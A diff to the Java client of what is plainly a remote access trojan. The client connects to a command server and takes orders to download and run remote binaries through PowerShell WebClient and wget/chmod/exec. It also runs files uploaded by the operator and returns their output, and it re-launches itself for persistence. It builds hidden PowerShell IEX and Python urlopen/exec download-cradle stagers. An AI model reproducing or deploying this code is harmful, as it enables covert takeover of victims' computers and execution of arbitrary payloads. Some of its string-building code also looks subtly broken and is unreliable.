@@ -119,8 +119,9 @@ public class Client {
     }
 
     private void connect() throws InterruptedException {
+        Socket socket = null;
         try {
-            Socket socket = new Socket(HOST, PORT);
+            socket = new Socket(HOST, PORT);
             dos = new DataOutputStream(socket.getOutputStream());
             dis = new DataInputStream(socket.getInputStream());
 
@@ -385,41 +386,49 @@ public class Client {
                     String fname = randTextAlpha(8) + url.substring(url.lastIndexOf('.'));
                     // Attempts to download and execute a binary. If it is successful, send back `1`, else `0`.
                     if (SYSTEMOS.contains("Windows")){
-                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '.\\" + fname + "');Start-Process '" + fname + "';Remove-Item -force " + fname;
+                        String fpath = System.getProperty("java.io.tmpdir") + fname;
+                        String cmd = "PowerShell [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('" + url + "', '" + fpath + "');Start-Process '" + fpath + "';Remove-Item -force " + fpath;
                         if (debugMode){System.out.println("CMD: " + cmd);}
                         Runtime.getRuntime().exec(cmd);
                         communicate(0);
                     } else {
                         // Probably bash/sh. Use sh just to be safe
-                        String cmd = "wget '"+ url + "' -O - | sh";
+                        if (fname.lastIndexOf('.') != 3 || fname.lastIndexOf('.') != 4) // probably doesnt have an extension
+                            fname = url.substring(url.lastIndexOf('/') + 1);
+                        String fpath = System.getProperty("java.io.tmpdir") + File.separator + fname;
+                        String cmd = "wget '"+ url + "' -O " + fpath + "; chmod +x " + fpath + "; " + fpath;
                         int status = 0;
                         Runtime.getRuntime().exec(cmd);
                         if (debugMode){System.out.println("CMD: " + cmd);}
                         communicate(status);
                     }
                     communicate(1);
-                } else if (input.contains("RDESKTOP")){
-                    /*
-                    RealVNC Server
-                    Linux: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-Linux-x64-ANY.tar.gz
-                    Windows: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-Windows.exe
-                    Mac: https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.4.0-MacOSX-x86_64.pkg
-                     */
-                    if (SYSTEMOS.contains("wind")){
-                        // Download windows
-                    } else if (SYSTEMOS.contains("lin")){
-                        // Linux
+                } else if (input.contains("UAE")){
+                    // Save file, execute it accordig to OS
+                    long len = dis.readLong();
+                    String fname = System.getProperty("java.io.tmpdir") + File.separator + input.split(";;")[1];
+                    File sent = new File(fname);
+                    FileOutputStream fos = new FileOutputStream(sent);
+                    BufferedOutputStream bos = new BufferedOutputStream(fos);
+                    for (int j = 0; j < len; j++) bos.write(dis.readInt());
+                    bos.close();
+                    fos.close();
+
+                    if (SYSTEMOS.contains("Windows")){
+                        // Run and get/send output
+                        String output = "";
+                        String cmd = "cmd /c \""+ fname + "\"";
+                        System.out.println(cmd);
+                        Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+                        output = s.hasNext() ? s.next() : "No output";
+                        communicate(output);
                     } else {
-                        // Mac
-                    }
-                } else if (input.contains("KEYL")){
-                    // Download binary depending on os
-                    if (SYSTEMOS.contains("wind")){
-                        // Download windows
-                    } else if (SYSTEMOS.contains("lin")){
-                        // Linux
-                    } else {
-                        // Mac
+                        // Run and get/send output
+                        String output = "";
+                        String cmd = fname;
+                        Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
+                        output = s.hasNext() ? s.next() : "No output";
+                        communicate(output);
                     }
                 } else if (input.equals("SHUTDOWN")){
                     communicate("EXIT"); // Tell server that client is leaving
@@ -433,12 +442,25 @@ public class Client {
 
                 }
             }
+        } catch(SocketException se){
+            if (debugMode){
+                se.printStackTrace();
+            }
+            Thread.sleep(1000);
+            connect();
         } catch (Exception e) {
             if (debugMode){
                 e.printStackTrace();
             }
-            Thread.sleep(1000);
-            connect();
+            assert socket.getClass() == Socket.class;
+            try{socket.close();}catch(IOException i){i.printStackTrace();}
+
+            Client client = new Client();
+            if (isPersistent) {
+                client.saveClient();
+            }
+            client.connect();
+
         }
     }
 
@@ -481,7 +503,7 @@ public class Client {
                 if (SYSTEMOS.contains("Windows")) {
                     pb = new ProcessBuilder("cmd.exe", "/c", command);
                 } else if (SYSTEMOS.contains("Linux")) {
-                    pb = new ProcessBuilder();
+                    pb = new ProcessBuilder(command);
                 }
                 if (pb != null) {
                     pb.redirectErrorStream(true);
@@ -501,9 +523,11 @@ public class Client {
                         communicate(s);
                     }
                 } catch (IOException | InterruptedException e) {
+                    if (debugMode) { e.printStackTrace(); }
                     exec("");
                 }
             } catch (IOException e) {
+                if (debugMode) { e.printStackTrace(); }
                 exec("");
             }
         }
@@ -722,9 +746,9 @@ public class Client {
         switch (target){
             case "python":
                 if (SYSTEMOS.contains("Windows")){
-                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(;" + url + "');exec(r.read());\"";
+                    cmd = "python.exe -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
                 } else {
-                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(;" + url + "');exec(r.read());\"";
+                    cmd = "python -c \"import sys;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen(" + url + "');exec(r.read());\"";
                 }
             case "powershell":
                 cmd = "powershell.exe -nop -w hidden -c $e=new-object net.webclient;$e.proxy=[Net.WebRequest]::GetSystemWebProxy();$e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $e.downloadstring('" + url + "');";
